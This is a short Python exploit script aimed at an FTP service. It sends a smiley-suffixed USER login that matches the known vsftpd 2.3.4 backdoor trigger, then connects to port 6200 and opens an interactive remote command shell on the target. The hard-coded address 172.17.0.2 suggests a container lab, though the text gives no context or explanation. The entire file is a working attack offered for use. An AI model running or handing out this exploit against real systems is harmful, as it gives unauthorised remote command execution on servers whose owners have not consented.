import socket
import time

def trigger(target_ip, ftp_port=21):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, ftp_port))

    banner = sock.recv(1024)
    print(banner.decode().strip())

    sock.sendall(b"USER test:)\r\n")
    resp = sock.recv(1024)
    print(resp.decode().strip())

    sock.sendall(b"PASS iosdfg\r\n")

    sock.settimeout(0.5)

    sock.close()
    print("[+] Backdoor should be open")   



def shell(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))

    print("[+] Connected to shell")

    while True:
        cmd = input("> ")
        if cmd.lower() in ["exit", "quit"]:
            break

        sock.sendall(cmd.encode() + b"\n")

        sock.settimeout(0.2)
        response = b""

        try:
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
        except socket.timeout:
            pass
        
        sock.settimeout(None)
        if response:
            print(response.decode(), end="")

    sock.close

if __name__ == "__main__":
    trigger("172.17.0.2")
    time.sleep(1)
    shell("172.17.0.2", 6200)